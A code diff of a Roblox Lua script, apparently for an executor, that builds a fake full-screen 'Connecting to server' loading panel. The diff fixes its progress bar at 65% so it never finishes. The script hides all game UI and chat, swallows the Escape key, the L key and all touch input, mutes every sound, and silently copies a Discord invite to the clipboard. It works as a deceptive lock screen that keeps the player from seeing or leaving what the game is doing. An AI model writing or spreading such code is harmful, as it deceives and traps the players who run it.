@@ -1,26 +1,24 @@
--- === ARTIFAKT 1: LOADING SCREEN (externer Loader) ===
+-- === ARTIFAKT 1: LOADING SCREEN (FIXED, NO ANIMATIONS) ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
 
-local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local StarterGui = game:GetService("StarterGui")
 local CoreGui = game:GetService("CoreGui")
 
--- Hide topbar & chat
-pcall(function() 
+-- Hide UI
+pcall(function()
     StarterGui:SetCore("TopbarEnabled", false)
-    for _, v in ipairs(Enum.CoreGuiType:GetEnumItems()) do 
-        StarterGui:SetCoreGuiEnabled(v, false) 
-    end 
+    for _, v in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+        StarterGui:SetCoreGuiEnabled(v, false)
+    end
 end)
 local topbar = CoreGui:FindFirstChild("TopBarApp", true)
 if topbar then topbar:Destroy() end
 local chat = CoreGui:FindFirstChild("ChatApp", true)
 if chat then chat:Destroy() end
 
--- Block ESC, L, and mobile taps
+-- Block input
 UserInputService.InputBegan:Connect(function(i)
     if i.KeyCode == Enum.KeyCode.Escape or i.KeyCode == Enum.KeyCode.L then
         i:Capture()
@@ -28,20 +26,18 @@ UserInputService.InputBegan:Connect(function(i)
 end)
 UserInputService.TouchStarted:Connect(function(i) i:Capture() end)
 
--- Mute all sounds immediately
-local function muteSounds(container)
-    for _, obj in ipairs(container:GetDescendants()) do
-        if obj:IsA("Sound") then
-            obj.Volume = 0
-            obj:Stop()
-        end
+-- Mute sounds
+local function mute(c)
+    for _, o in ipairs(c:GetDescendants()) do
+        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
     end
+    c.DescendantAdded:Connect(function(o)
+        if o:IsA("Sound") then o.Volume = 0; o:Stop() end
+    end)
 end
-for _, container in {workspace, Players, game.ReplicatedStorage, game.Lighting, StarterGui, SoundService} do
-    muteSounds(container)
-end
+for _, c in {workspace, Players, game.ReplicatedStorage, game.Lighting, StarterGui, game:GetService("SoundService")} do mute(c) end
 
--- Wait for LocalPlayer
+-- Wait for LP
 if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end
 local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
@@ -50,7 +46,6 @@ local UIParent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
 local old = UIParent:FindFirstChild("LoadingScreen_GUI")
 if old then old:Destroy() end
 
--- ScreenGui
 local SG = Instance.new("ScreenGui")
 SG.Name = "LoadingScreen_GUI"
 SG.IgnoreGuiInset = true
@@ -59,9 +54,7 @@ SG.ZIndexBehavior = Enum.ZIndexBehavior.Global
 SG.DisplayOrder = 999999
 SG.Parent = UIParent
 
--- Colors
 local COLORS = {
-    bg = Color3.fromRGB(6,8,16),
     card = Color3.fromRGB(14,12,24),
     text = Color3.fromRGB(235,235,245),
     dim = Color3.fromRGB(170,175,200),
@@ -69,71 +62,45 @@ local COLORS = {
     a2 = Color3.fromRGB(50,180,255),
 }
 
--- Container
+-- Container (fixed size, no animation)
 local Container = Instance.new("Frame", SG)
-Container.AnchorPoint = Vector2.new(0.5, 0.5)
-Container.Position = UDim2.fromScale(0.5, 0.5)
-Container.Size = UDim2.fromOffset(480, 360)
+Container.AnchorPoint = Vector2.new(0.5,0.5)
+Container.Position = UDim2.fromScale(0.5,0.5)
+Container.Size = UDim2.fromOffset(480,360)
 Container.BackgroundColor3 = COLORS.card
 Container.BackgroundTransparency = 0.08
 Container.BorderSizePixel = 0
 Container.ZIndex = 10
-local corner = Instance.new("UICorner", Container); corner.CornerRadius = UDim.new(0, 20)
-local stroke = Instance.new("UIStroke", Container); stroke.Thickness = 2; stroke.Transparency = 0.15
-local grad = Instance.new("UIGradient", stroke); grad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)
+local cCorner = Instance.new("UICorner", Container); cCorner.CornerRadius = UDim.new(0,20)
+local cStroke = Instance.new("UIStroke", Container); cStroke.Thickness = 2; cStroke.Transparency = 0.15
+local cGrad = Instance.new("UIGradient", cStroke); cGrad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)
 
 -- Header
 local Header = Instance.new("Frame", Container)
 Header.BackgroundTransparency = 1
-Header.Size = UDim2.new(1, -40, 0, 90)
-Header.Position = UDim2.new(0, 20, 0, 20)
+Header.Size = UDim2.new(1,-40,0,90)
+Header.Position = UDim2.new(0,20,0,20)
 Header.ZIndex = 20
 
 -- Avatar
-local AvatarContainer = Instance.new("Frame", Header)
-AvatarContainer.Size = UDim2.fromOffset(70, 70)
-AvatarContainer.BackgroundTransparency = 1
-AvatarContainer.ZIndex = 21
-local Avatar = Instance.new("ImageLabel", AvatarContainer)
+local Avatar = Instance.new("ImageLabel", Header)
+Avatar.Size = UDim2.fromOffset(70,70)
 Avatar.BackgroundTransparency = 1
-Avatar.Size = UDim2.fromScale(1, 1)
 Avatar.Image = "rbxassetid://0"
-Avatar.ZIndex = 22
-local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1, 0)
+Avatar.ZIndex = 21
+local aCorner = Instance.new("UICorner", Avatar); aCorner.CornerRadius = UDim.new(1,0)
 local aStroke = Instance.new("UIStroke", Avatar); aStroke.Thickness = 3; aStroke.Color = COLORS.a1; aStroke.Transparency = 0.3
 
--- Glow
-local Glow = Instance.new("ImageLabel", AvatarContainer)
-Glow.Size = UDim2.fromScale(1.3, 1.3)
-Glow.Position = UDim2.fromScale(0.5, 0.5)
-Glow.AnchorPoint = Vector2.new(0.5, 0.5)
-Glow.BackgroundTransparency = 1
-Glow.Image = "rbxassetid://0"
-Glow.ImageTransparency = 0.6
-Glow.ZIndex = 21
-local gCorner = Instance.new("UICorner", Glow); gCorner.CornerRadius = UDim.new(1, 0)
-
--- Load avatar
 task.spawn(function()
     local ok, url = pcall(Players.GetUserThumbnailAsync, Players, LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-    if ok and url then Avatar.Image = url; Glow.Image = url end
-end)
-
--- Pulsing glow
-task.spawn(function()
-    while Glow and Glow.Parent do
-        TweenService:Create(Glow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {ImageTransparency = 0.8, Size = UDim2.fromScale(1.4, 1.4)}):Play()
-        task.wait(1.5)
-        TweenService:Create(Glow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {ImageTransparency = 0.6, Size = UDim2.fromScale(1.3, 1.3)}):Play()
-        task.wait(1.5)
-    end
+    if ok and url then Avatar.Image = url end
 end)
 
 -- Info
 local Info = Instance.new("Frame", Header)
 Info.BackgroundTransparency = 1
-Info.Size = UDim2.new(1, -90, 1, 0)
-Info.Position = UDim2.new(0, 90, 0, 0)
+Info.Size = UDim2.new(1,-90,1,0)
+Info.Position = UDim2.new(0,90,0,0)
 Info.ZIndex = 21
 
 local Title = Instance.new("TextLabel", Info)
@@ -145,7 +112,7 @@ Title.TextColor3 = COLORS.a1
 Title.TextStrokeColor3 = Color3.fromRGB(20,0,40)
 Title.TextStrokeTransparency = 0.5
 Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Size = UDim2.new(1, 0, 0, 32)
+Title.Size = UDim2.new(1,0,0,32)
 Title.ZIndex = 22
 
 local UserInfo = Instance.new("TextLabel", Info)
@@ -154,8 +121,8 @@ UserInfo.Font = Enum.Font.Gotham
 UserInfo.TextSize = 13
 UserInfo.TextColor3 = COLORS.dim
 UserInfo.TextXAlignment = Enum.TextXAlignment.Left
-UserInfo.Size = UDim2.new(1, 0, 0, 20)
-UserInfo.Position = UDim2.new(0, 0, 0, 34)
+UserInfo.Size = UDim2.new(1,0,0,20)
+UserInfo.Position = UDim2.new(0,0,0,34)
 UserInfo.ZIndex = 22
 
 task.spawn(function()
@@ -168,66 +135,66 @@ end)
 
 local Badge = Instance.new("TextLabel", Info)
 Badge.BackgroundTransparency = 1
-Badge.Text = "Loading..."
+Badge.Text = "Connecting..."
 Badge.Font = Enum.Font.GothamBold
 Badge.TextSize = 13
 Badge.TextColor3 = COLORS.a2
 Badge.TextXAlignment = Enum.TextXAlignment.Left
-Badge.Size = UDim2.new(1, 0, 0, 18)
-Badge.Position = UDim2.new(0, 0, 0, 56)
+Badge.Size = UDim2.new(1,0,0,18)
+Badge.Position = UDim2.new(0,0,0,56)
 Badge.ZIndex = 22
 
 -- Divider
 local Divider = Instance.new("Frame", Container)
-Divider.Size = UDim2.new(1, -40, 0, 1)
-Divider.Position = UDim2.new(0, 20, 0, 125)
+Divider.Size = UDim2.new(1,-40,0,1)
+Divider.Position = UDim2.new(0,20,0,125)
 Divider.BackgroundColor3 = COLORS.dim
 Divider.BackgroundTransparency = 0.85
 Divider.ZIndex = 20
 
--- Loading Section
+-- Loading
 local Loading = Instance.new("Frame", Container)
 Loading.BackgroundTransparency = 1
-Loading.Size = UDim2.new(1, -40, 0, 180)
-Loading.Position = UDim2.new(0, 20, 0, 140)
+Loading.Size = UDim2.new(1,-40,0,180)
+Loading.Position = UDim2.new(0,20,0,140)
 Loading.ZIndex = 20
 
 local StatusText = Instance.new("TextLabel", Loading)
 StatusText.BackgroundTransparency = 1
-StatusText.Text = "Initializing"
+StatusText.Text = "Connecting to server"
 StatusText.Font = Enum.Font.GothamSemibold
 StatusText.TextSize = 18
 StatusText.TextColor3 = COLORS.text
-StatusText.Size = UDim2.new(1, 0, 0, 26)
-StatusText.Position = UDim2.new(0, 0, 0, 10)
+StatusText.Size = UDim2.new(1,0,0,26)
+StatusText.Position = UDim2.new(0,0,0,10)
 StatusText.ZIndex = 22
 StatusText.TextXAlignment = Enum.TextXAlignment.Center
 
 -- Progress
 local ProgressBg = Instance.new("Frame", Loading)
-ProgressBg.Size = UDim2.new(1, 0, 0, 10)
-ProgressBg.Position = UDim2.new(0, 0, 0, 55)
-ProgressBg.BackgroundColor3 = Color3.fromRGB(20, 18, 34)
+ProgressBg.Size = UDim2.new(1,0,0,10)
+ProgressBg.Position = UDim2.new(0,0,0,55)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(20,18,34)
 ProgressBg.BackgroundTransparency = 0.1
 ProgressBg.ZIndex = 21
-local pCorner = Instance.new("UICorner", ProgressBg); pCorner.CornerRadius = UDim.new(1, 0)
-local pStroke = Instance.new("UIStroke", ProgressBg); pStroke.Thickness = 1; pStroke.Color = Color3.fromRGB(40,40,80); pStroke.Transparency = 0.3
+local pbCorner = Instance.new("UICorner", ProgressBg); pbCorner.CornerRadius = UDim.new(1,0)
+local pbStroke = Instance.new("UIStroke", ProgressBg); pbStroke.Thickness = 1; pbStroke.Color = Color3.fromRGB(40,40,80); pbStroke.Transparency = 0.3
 
 local ProgressBar = Instance.new("Frame", ProgressBg)
-ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.Size = UDim2.new(0.65, 0, 1, 0) -- Fixed at 65%
 ProgressBar.BackgroundColor3 = COLORS.a1
 ProgressBar.ZIndex = 22
-local bCorner = Instance.new("UICorner", ProgressBar); bCorner.CornerRadius = UDim.new(1, 0)
-local bGrad = Instance.new("UIGradient", ProgressBar); bGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)
+local barCorner = Instance.new("UICorner", ProgressBar); barCorner.CornerRadius = UDim.new(1,0)
+local barGrad = Instance.new("UIGradient", ProgressBar); barGrad.Color = ColorSequence.new(COLORS.a1, COLORS.a2)
 
 local Percentage = Instance.new("TextLabel", Loading)
 Percentage.BackgroundTransparency = 1
-Percentage.Text = "0%"
+Percentage.Text = "65%"
 Percentage.Font = Enum.Font.GothamBold
 Percentage.TextSize = 24
 Percentage.TextColor3 = COLORS.a2
-Percentage.Size = UDim2.new(1, 0, 0, 28)
-Percentage.Position = UDim2.new(0, 0, 0, 80)
+Percentage.Size = UDim2.new(1,0,0,28)
+Percentage.Position = UDim2.new(0,0,0,80)
 Percentage.ZIndex = 22
 Percentage.TextXAlignment = Enum.TextXAlignment.Center
 
@@ -237,98 +204,7 @@ Subtitle.Text = "Support https://discord.gg/rvZndRfkyX"
 Subtitle.Font = Enum.Font.Gotham
 Subtitle.TextSize = 13
 Subtitle.TextColor3 = COLORS.dim
-Subtitle.Size = UDim2.new(1, 0, 0, 20)
-Subtitle.Position = UDim2.new(0, 0, 0, 120)
+Subtitle.Size = UDim2.new(1,0,0,20)
+Subtitle.Position = UDim2.new(0,0,0,120)
 Subtitle.ZIndex = 22
 Subtitle.TextXAlignment = Enum.TextXAlignment.Center
-
--- Info Cards
-local Cards = Instance.new("Frame", Loading)
-Cards.BackgroundTransparency = 1
-Cards.Size = UDim2.new(1, 0, 0, 30)
-Cards.Position = UDim2.new(0, 0, 0, 150)
-Cards.ZIndex = 20
-
-local function card(text, icon, pos)
-    local f = Instance.new("Frame", Cards)
-    f.Size = UDim2.new(0.31, 0, 1, 0)
-    f.Position = pos
-    f.BackgroundColor3 = Color3.fromRGB(20,18,35)
-    f.BackgroundTransparency = 0.3
-    f.ZIndex = 21
-    local c = Instance.new("UICorner", f); c.CornerRadius = UDim.new(0,8)
-    local l = Instance.new("TextLabel", f)
-    l.Size = UDim2.fromScale(1,1)
-    l.BackgroundTransparency = 1
-    l.Text = icon.." "..text
-    l.Font = Enum.Font.GothamMedium
-    l.TextSize = 11
-    l.TextColor3 = COLORS.dim
-    l.ZIndex = 22
-end
-card("Secure", "Lock", UDim2.fromScale(0,0))
-card("Fast", "Lightning", UDim2.fromScale(0.345,0))
-card("Latest", "Sparkles", UDim2.fromScale(0.69,0))
-
--- Dots animation
-local dots = ""
-task.spawn(function()
-    while StatusText and StatusText.Parent do
-        for i = 0, 3 do
-            if not StatusText then break end
-            StatusText.Text = dots .. string.rep(".", i)
-            task.wait(0.4)
-        end
-    end
-end)
-
--- Loading steps
-local steps = {
-    {text = "Initializing", time = 1.2, progress = 15},
-    {text = "Loading assets", time = 1.5, progress = 35},
-    {text = "Connecting to server", time = 2.0, progress = 65},
-}
-
-task.spawn(function()
-    for _, step in ipairs(steps) do
-        dots = step.text
-        Badge.Text = step.text
-        local target = UDim2.new(step.progress / 100, 0, 1, 0)
-        TweenService:Create(ProgressBar, TweenInfo.new(step.time * 0.8, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Size = target}):Play()
-        local start = tonumber(Percentage.Text:match("%d+")) or 0
-        local stepsCount = math.floor(step.time * 30)
-        for i = 1, stepsCount do
-            local p = math.floor(start + (step.progress - start) * (i / stepsCount))
-            Percentage.Text = p .. "%"
-            task.wait(step.time / stepsCount)
-        end
-        task.wait(0.5)
-    end
-    dots = "Connecting to server"
-    Badge.Text = "Connecting..."
-end)
-
--- Entry animation
-Container.Size = UDim2.fromOffset(0, 0)
-Container.BackgroundTransparency = 1
-stroke.Transparency = 1
-task.wait(0.1)
-TweenService:Create(Container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(480, 360), BackgroundTransparency = 0.08}):Play()
-TweenService:Create(stroke, TweenInfo.new(0.7), {Transparency = 0.15}):Play()
-task.wait(0.3)
-for _, el in {Avatar, Title, UserInfo, Badge, StatusText, Percentage, Subtitle} do
-    if el:IsA("GuiObject") then
-        el.Visible = false
-        task.spawn(function()
-            task.wait(0.05 * math.random(1, 5))
-            el.Visible = true
-            if el:IsA("TextLabel") then
-                el.TextTransparency = 1
-                TweenService:Create(el, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-            elseif el:IsA("ImageLabel") then
-                el.ImageTransparency = 1
-                TweenService:Create(el, TweenInfo.new(0.5), {ImageTransparency = 0}):Play()
-            end
-        end)
-    end
-end
